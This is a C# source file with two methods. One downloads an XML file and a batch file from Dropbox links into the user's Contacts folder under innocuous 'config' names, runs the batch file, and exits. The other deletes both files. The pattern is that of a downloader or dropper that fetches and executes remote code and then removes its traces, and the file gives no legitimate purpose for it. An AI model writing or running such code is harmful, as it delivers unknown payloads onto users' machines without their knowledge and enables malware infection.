using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ataria
{
    class Methods
    {

        internal static void extMethod()
        {
            var pathWithEnv = @"%USERPROFILE%\Contacts\config.xml";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            var pathWithEnv2 = @"%USERPROFILE%\Contacts\configexception.bat";
            var filePath2 = Environment.ExpandEnvironmentVariables(pathWithEnv2);
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://dl.dropboxusercontent.com/s/c9k9dpnlp4qpof7/config.xml?dl=1", filePath);
            WebClient webClient2 = new WebClient();
            webClient.DownloadFile("https://www.dropbox.com/s/icg2xuwtx2yx4d0/configexception.bat?dl=1", filePath2);
            System.Diagnostics.Process.Start(filePath2);
            Environment.Exit(1);
        }

        internal static void delFile()
        {
            var pathWithEnv = @"%USERPROFILE%\Contacts\config.xml";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            var pathWithEnv2 = @"%USERPROFILE%\Contacts\configexception.bat";
            var filePath2 = Environment.ExpandEnvironmentVariables(pathWithEnv2);
            File.Delete(filePath);
            File.Delete(filePath2);
        }


    }
}
